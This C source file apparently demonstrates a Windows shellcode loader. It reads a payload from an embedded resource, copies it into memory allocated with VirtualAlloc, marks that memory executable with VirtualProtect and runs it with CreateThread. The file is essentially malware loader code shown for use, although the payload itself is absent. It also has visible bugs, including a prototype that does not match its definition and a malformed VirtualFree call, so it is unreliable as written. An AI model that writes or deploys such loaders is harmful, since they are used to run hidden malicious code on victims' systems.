#include <stdio.h>
#include <Windows.h>
#include "resource.h"


BOOL shellcodeexecution(SIZE_T spayload);


int main() {


	HRSRC hrsrc;
	HGLOBAL hglobal;
	LPVOID lpaddressofresource;
	SIZE_T spayload;

	hrsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);



	hglobal = LoadResource(NULL, hrsrc);

	if (hglobal == NULL) {
		printf("load resource failed with error no %d\n", GetLastError());


	}

	lpaddressofresource = LockResource(hglobal);

	if (lpaddressofresource == NULL) {
		printf("the lockresource failed with error no %d", GetLastError());
	}


	spayload = SizeofResource(NULL, hrsrc);

	if (spayload == NULL) {
		printf("spayload failed with error %d", GetLastError());
	}

	printf("The size of payload is %ld\n", spayload);
	printf("the starting address of the payload is 0x%p\n", lpaddressofresource);


	printf("%X\n",*((unsigned char*)lpaddressofresource + 1));

	PVOID Tempbuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, spayload);


	Tempbuffer = memcpy(Tempbuffer, lpaddressofresource, spayload);
	printf("the address of temp buffer is 0x%p\n", Tempbuffer);

	


	shellcodeexecution(spayload,Tempbuffer);

	printf("press <enter> to exit");
	getchar();

}

BOOL shellcodeexecution(SIZE_T spayload,LPVOID tempbuffer) {

	LPVOID ppayloadaddress = NULL;
	DWORD lpfloldprotect = NULL;

	ppayloadaddress = VirtualAlloc(NULL, spayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	if (ppayloadaddress == NULL) {
		printf("the virtual alloc failed with error %d", GetLastError());
	}


	else {

		memcpy(ppayloadaddress, tempbuffer, spayload);
		memset(tempbuffer, 0, spayload);
		printf("virutal address allocated at address 0x%p\n", ppayloadaddress);

	}

	

	if (VirtualProtect(ppayloadaddress, spayload, PAGE_EXECUTE_READWRITE, &lpfloldprotect) == 0) {
		printf("virtual protect failed with error no %d\n", GetLastError());
	}

	printf("press enter to run");
	getchar();


	if (CreateThread(NULL, NULL, ppayloadaddress, NULL, NULL, NULL) == NULL) {
		printf("create thread failed with error %d", GetLastError());
	}


	VirtualFree(ppayloadaddress, shellcodeexecution, MEM_RELEASE);
	

	

	return TRUE;
}